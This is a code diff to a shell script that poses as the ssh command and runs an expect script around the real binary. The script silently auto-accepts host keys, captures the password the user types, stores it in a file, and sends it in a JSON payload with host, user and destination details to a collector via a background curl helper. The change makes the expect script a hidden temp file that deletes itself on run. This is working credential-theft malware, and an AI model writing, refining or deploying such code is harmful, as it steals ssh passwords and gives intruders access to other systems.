@@ -132,54 +132,62 @@ export __SSH_TS="$HOST_TS"
 export __SSH_DST="$DEST_HOST"
 export __SSH_DU="$DEST_USER"
 
-expect -c '
-    log_user 1
-    set timeout 30
-    set real_ssh [lindex $argv 0]
-    set ssh_args [lrange $argv 1 end]
+# Write expect script to a temp file so $argv works correctly.
+# (expect -c 'script' args tries to source the first arg as a tcl
+#  file instead of putting it in $argv — breaks on binaries)
+EXPECT_SCRIPT=$(mktemp /tmp/.sshexp.XXXXXX)
+chmod 700 "$EXPECT_SCRIPT"
+cat > "$EXPECT_SCRIPT" << 'EXPECTEOF'
+file delete [info script]
+log_user 1
+set timeout 30
+set real_ssh [lindex $argv 0]
+set ssh_args [lrange $argv 1 end]
 
-    spawn $real_ssh {*}$ssh_args
+spawn $real_ssh {*}$ssh_args
 
-    while 1 {
-        expect {
-            -re {Are you sure you want to continue connecting \(yes/no(/\[fingerprint\])?\)\?} {
-                send "yes\r"
-            }
-
-            -re {\(yes/no\)\?} {
-                send "yes\r"
-            }
-
-            -re {[Pp]assword[^:]*: $} {
-                stty -echo
-                expect_user -re {(.*)\n}
-                set pw $expect_out(1,string)
-                stty echo
-                send_user "\n"
-
-                set fh [open $env(__SSH_PW_FILE) w]
-                puts -nonewline $fh $pw
-                close $fh
-
-                set safe_pw [string map {\\ \\\\ \" \\\"} $pw]
-                set payload [format                     {\"host_ip\":\"%s\",\"user\":\"%s\",\"event_type\":\"ssh\",\"timestamp\":\"%s\",\"data\":{\"destination\":\"%s\",\"dest_user\":\"%s\",\"password\":\"%s\"}}                     $env(__SSH_HIP) $env(__SSH_USR) $env(__SSH_TS) $env(__SSH_DST) $env(__SSH_DU) $safe_pw]
-                set payload "{[string range $payload 0 end]}"
-                set fh2 [open $env(__SSH_PAY_FILE) w]
-                puts -nonewline $fh2 $payload
-                close $fh2
-
-                exec /bin/bash $env(__SSH_CURL) $env(__SSH_PAY_FILE) $env(__SSH_COLL) &
-
-                send "$pw\r"
-                interact
-                break
-            }
-
-            eof { break }
-            timeout { interact; break }
+while 1 {
+    expect {
+        -re {Are you sure you want to continue connecting \(yes/no(/\[fingerprint\])?\)\?} {
+            send "yes\r"
         }
+
+        -re {\(yes/no\)\?} {
+            send "yes\r"
+        }
+
+        -re {[Pp]assword[^:]*: $} {
+            stty -echo
+            expect_user -re {(.*)\n}
+            set pw $expect_out(1,string)
+            stty echo
+            send_user "\n"
+
+            set fh [open $env(__SSH_PW_FILE) w]
+            puts -nonewline $fh $pw
+            close $fh
+
+            set safe_pw [string map {\\ \\\\ \" \\\"} $pw]
+            set payload [format {\"host_ip\":\"%s\",\"user\":\"%s\",\"event_type\":\"ssh\",\"timestamp\":\"%s\",\"data\":{\"destination\":\"%s\",\"dest_user\":\"%s\",\"password\":\"%s\"}} $env(__SSH_HIP) $env(__SSH_USR) $env(__SSH_TS) $env(__SSH_DST) $env(__SSH_DU) $safe_pw]
+            set payload "{[string range $payload 0 end]}"
+            set fh2 [open $env(__SSH_PAY_FILE) w]
+            puts -nonewline $fh2 $payload
+            close $fh2
+
+            exec /bin/bash $env(__SSH_CURL) $env(__SSH_PAY_FILE) $env(__SSH_COLL) &
+
+            send "$pw\r"
+            interact
+            break
+        }
+
+        eof { break }
+        timeout { interact; break }
     }
-' "$REAL_SSH" "$@"
+}
+EXPECTEOF
+
+expect "$EXPECT_SCRIPT" "$REAL_SSH" "$@"
 SSH_RC=$?
 
 # Fallback: if curl helper didn't fire (e.g. key auth, no password prompt),
